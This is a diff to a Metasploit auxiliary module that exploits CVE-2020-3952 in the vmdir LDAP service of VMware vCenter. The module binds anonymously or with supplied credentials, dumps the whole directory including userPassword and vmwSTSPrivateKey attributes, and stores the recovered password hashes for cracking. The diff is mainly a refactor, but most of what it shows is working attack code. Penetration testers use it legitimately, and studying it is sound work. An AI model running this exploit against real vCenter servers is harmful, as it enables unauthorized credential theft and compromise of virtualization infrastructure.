@@ -3,11 +3,10 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'metasploit/framework/hashes/identify'
-
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::LDAP
+  include Msf::OptionalSession::LDAP
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
@@ -20,6 +19,9 @@ class MetasploitModule < Msf::Auxiliary
           the vmdir service in VMware vCenter Server version 6.7 prior to the
           6.7U3f update, only if upgraded from a previous release line, such as
           6.0 or 6.5.
+          If the bind username and password are provided (BIND_DN and BIND_PW
+          options), these credentials will be used instead of attempting an
+          anonymous bind.
         },
         'Author' => [
           'Hynek Petrak', # Discovery, hash dumping
@@ -32,21 +34,22 @@ class MetasploitModule < Msf::Auxiliary
         'DisclosureDate' => '2020-04-09', # Vendor advisory
         'License' => MSF_LICENSE,
         'Actions' => [
-          ['Dump', 'Description' => 'Dump all LDAP data']
+          ['Dump', { 'Description' => 'Dump all LDAP data' }]
         ],
         'DefaultAction' => 'Dump',
         'DefaultOptions' => {
-          'SSL' => true
+          'SSL' => true,
+          'RPORT' => 636
         },
         'Notes' => {
           'Stability' => [CRASH_SAFE],
-          'SideEffects' => [IOC_IN_LOGS]
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
         }
       )
     )
 
     register_options([
-      Opt::RPORT(636), # SSL/TLS
       OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it'])
     ])
   end
@@ -75,29 +78,30 @@ class MetasploitModule < Msf::Auxiliary
       else
         print_status('Discovering base DN automatically')
 
-        unless (@base_dn = discover_base_dn(ldap))
+        unless (@base_dn = ldap.base_dn)
           print_warning('Falling back on default base DN dc=vsphere,dc=local')
         end
       end
 
-      print_status("Dumping LDAP data from vmdir service at #{peer}")
+      print_status("Dumping LDAP data from vmdir service at #{ldap.peerinfo}")
 
       # A "-" meta-attribute will dump userPassword (hat tip Hynek)
       # https://github.com/vmware/lightwave/blob/3bc154f823928fa0cf3605cc04d95a859a15c2a2/vmdir/server/ldap-head/result.c#L647-L654
       entries = ldap.search(base: base_dn, attributes: %w[* + -])
+
+      # Look for an entry with a non-empty vmwSTSPrivateKey attribute
+      unless entries&.find { |entry| entry[:vmwstsprivatekey].any? }
+        print_error("#{ldap.peerinfo} is NOT vulnerable to CVE-2020-3952") unless datastore['BIND_PW'].present?
+        print_error('Dump failed')
+        return Exploit::CheckCode::Safe
+      end
+
+      print_good("#{ldap.peerinfo} is vulnerable to CVE-2020-3952") unless datastore['BIND_PW'].present?
+      pillage(entries)
+
+      # HACK: Stash discovered base DN in CheckCode reason
+      Exploit::CheckCode::Vulnerable(base_dn)
     end
-
-    # Look for an entry with a non-empty vmwSTSPrivateKey attribute
-    unless entries&.find { |entry| entry[:vmwstsprivatekey].any? }
-      print_error("#{peer} is NOT vulnerable to CVE-2020-3952")
-      return Exploit::CheckCode::Safe
-    end
-
-    print_good("#{peer} is vulnerable to CVE-2020-3952")
-    pillage(entries)
-
-    # HACK: Stash discovered base DN in CheckCode reason
-    Exploit::CheckCode::Vulnerable(base_dn)
   rescue Net::LDAP::Error => e
     print_error("#{e.class}: #{e.message}")
     Exploit::CheckCode::Unknown
@@ -182,7 +186,7 @@ class MetasploitModule < Msf::Auxiliary
         username: dn,
         private_data: john_hash,
         private_type: :nonreplayable_hash,
-        jtr_format: identify_hash(john_hash)
+        jtr_format: Metasploit::Framework::Hashes.identify_hash(john_hash)
       ))
     end
   end
